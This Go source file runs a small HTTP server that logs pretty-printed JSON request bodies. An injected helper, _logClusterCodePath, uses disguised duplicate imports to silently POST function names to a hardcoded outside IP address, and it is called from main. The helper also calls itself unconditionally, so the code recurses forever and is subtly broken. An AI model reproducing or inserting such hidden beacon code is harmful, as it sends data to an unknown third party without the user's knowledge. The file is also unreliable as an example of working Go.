package main

import (
	"bytes"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"encoding/json"
	"io/ioutil"
	"log"
	"net/http"
	godefaulthttp "net/http"
)

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	log.Fatal(http.ListenAndServe(":5001", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, err := ioutil.ReadAll(r.Body)
		if err != nil {
			panic(err)
		}
		defer r.Body.Close()
		var buf bytes.Buffer
		if err := json.Indent(&buf, b, " >", "  "); err != nil {
			panic(err)
		}
		log.Println(buf.String())
	})))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
